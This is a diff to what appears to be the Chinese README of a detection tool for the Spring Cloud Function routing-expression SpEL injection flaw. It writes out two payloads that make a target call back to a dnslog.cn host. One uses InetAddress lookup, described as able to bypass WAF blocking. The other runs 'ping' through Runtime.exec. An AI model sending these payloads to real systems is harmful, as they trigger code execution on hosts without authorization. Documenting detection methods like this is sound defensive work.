@@ -42,8 +42,9 @@
 
 两种检测方法：
 
-* 通过Java自带InetAddres库`spring.cloud.function.routing-expression:T(java.net.InetAddress).getByName("xxx.dnslog.cn")`回连探测（可绕过WAF拦截命令执行）
-* 通过执行ping命令`spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("ping xxx.dnslog.cn")`回连探测
+* 通过Java自带InetAddres库：`spring.cloud.function.routing-expression:T(java.net.InetAddress).getByName("xxx.dnslog.cn")`回连探测（可绕过WAF拦截命令执行进行漏洞探测）
+* 通过执行`ping`命令：`spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("ping xxx.dnslog.cn")`回连探测
+* 会扫描当前URI、以及当前URI拼接默认路由`/functionRouter`进行漏洞探测。
 
 ## 编译
 
